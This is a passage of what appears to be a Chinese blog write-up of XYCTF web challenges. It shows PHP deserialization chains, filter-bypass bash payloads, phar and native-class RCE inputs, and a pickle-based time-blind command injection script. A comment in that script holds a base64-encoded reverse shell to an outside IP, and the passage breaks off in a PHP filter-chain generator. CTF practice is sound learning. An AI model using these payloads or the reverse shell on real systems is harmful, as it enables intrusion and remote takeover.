class="variable">$luo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;luo = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lao = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span> = <span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span> = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;adwa = <span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&#x27;oSthing&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd_char</span>) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;foreach&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>$0为当前运行的脚本(即bash), 然后用八进制ascii传入cat &#x2F;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\040\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure><h2 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h2><p>简单的phar反序列化, 生成的phar文件用gzip压缩绕过题目的waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;cmd = <span class="string">&#x27;print_r(file_get_contents(array_rand(array_flip(scandir(end(array_reverse(str_split(getcwd()))))))));__halt_compiler();__halt_compiler();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=phar:///tmp/364be8860e8d72b4358b5e88099a935a.png/flag.txt</span><br></pre></td></tr></table></figure><h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure><p>这种就只能考虑原生类读文件了, 我找到了SimpleXMLElement这个类,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SimpleXMLElement&amp;aa=&lt;element&gt;system&lt;/element&gt;&amp;c=__toString&amp;b=SimpleXMLElement&amp;bb=&lt;element&gt;cat /flag&lt;/element&gt;</span><br></pre></td></tr></table></figure><p>看其他师傅的wp, 也可以使用Error</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=Error&amp;b=Error&amp;aa=system&amp;bb=cat /f*&amp;c=getMessage</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>很抽象, 用bash时间盲注枚举flag</p><p>贴出我的答辩脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost:49689/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [ &quot;$(head -n 1 /flag | cut -c 1)&quot; = &quot;q&quot; ] &amp;&amp; sleep 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=if [ `cat /flag | cut -c 1` = &#x27;q&#x27; ];then sleep 5;fi&quot;</span></span><br><span class="line"></span><br><span class="line">alphabet = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-</span></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf27</span></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf2fc2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lists = &#x27;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;RememberMe=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;if [ `cat /flag | cut -c &#123;&#125;` = &quot;&#123;&#125;&quot; ];then sleep 30;fi&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">lenth = <span class="built_in">len</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(lenth + <span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> k &gt; <span class="built_in">len</span>(alphabet):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;alphabet too small!!!!&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line"></span><br><span class="line">        op = opcode.<span class="built_in">format</span>(i, alphabet[k])</span><br><span class="line"></span><br><span class="line">        payload = base64.b64encode(op.encode())</span><br><span class="line">        time1 = time.time()</span><br><span class="line">        headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;RememberMe=&#x27;</span> + payload.decode()</span><br><span class="line">        <span class="built_in">print</span>(opcode.<span class="built_in">format</span>(i,alphabet[k]))</span><br><span class="line">        res = requests.get(url=url, headers=headers)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;waf&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;waf!!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> time.time() - time1 &gt; <span class="number">30</span>:</span><br><span class="line">            flag = flag + alphabet[k]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k = k + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="εZ-¿м-Kε¿-赛后"><a href="#εZ-¿м-Kε¿-赛后" class="headerlink" title="εZ?¿м@Kε¿?(赛后)"></a>εZ?¿м@Kε¿?(赛后)</h2><p>第一反应是构造一个文件写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;$@&lt;$&lt;</span><br></pre></td></tr></table></figure><p>这里可以创建一个FLAG文件在当前目录, 但并不能如我所愿把&#x2F;flag里的内容重定向进去</p><p>看了wp, 这里把&#x2F;flag传给bash, bash读取内容, 尝试把内容当成命令执行, 但是这个命令是不存在的, 显示报错, 把flag带出来, 这与之前见过的nmap oG参数写shell有异曲同工之妙, 可惜当时没想到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$(&lt;$&lt;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240427133820719.png" alt="image-20240427133820719"></p><h2 id="连连看到底是连连什么看-赛后"><a href="#连连看到底是连连什么看-赛后" class="headerlink" title="连连看到底是连连什么看(赛后)"></a>连连看到底是连连什么看(赛后)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题的trick在很久之前就看过, 利用各种php过滤器,无需零时文件包含shell</p><p><a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>这里就比较抽象, 没找到很好的脚本, 一开始思路就是多几次base64解码来把XYCTF后面的乱码忽略, 奈何一直不成功就放弃了</p><p>贴一下不错的脚本</p><p>php_filter_chain_generator.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># - Useful infos -</span></span><br><span class="line"><span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span></span><br><span class="line"><span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span></span><br><span class="line"><span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No need to guess a valid filename anymore</span></span><br><span class="line">file_to_use = <span class="string">&quot;php://temp&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span 